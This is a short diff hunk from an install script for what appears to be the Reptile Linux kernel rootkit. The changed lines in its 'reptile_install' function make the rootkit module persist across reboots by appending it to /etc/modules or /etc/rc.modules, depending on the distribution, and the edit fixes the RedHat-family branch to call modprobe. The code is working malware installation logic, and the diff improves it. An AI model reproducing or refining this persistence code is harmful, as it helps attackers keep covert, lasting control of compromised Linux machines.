@@ -203,7 +203,7 @@ function reptile_install {
     	if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
         	echo -ne "#<$TAG>\n$MODULE\n#</$TAG>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
-        	echo -ne "#<$TAG>\n$MODULE\n#</$TAG>" >> /etc/rc.modules && \
+        	echo -ne "#<$TAG>\nmodprobe $MODULE\n#</$TAG>" >> /etc/rc.modules && \
 		chmod +x /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 	#elif [ "$SYSTEM" == "arch" ]; then
         #	echo -ne "#<$TAG>\n$MODULE\n#</$TAG>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
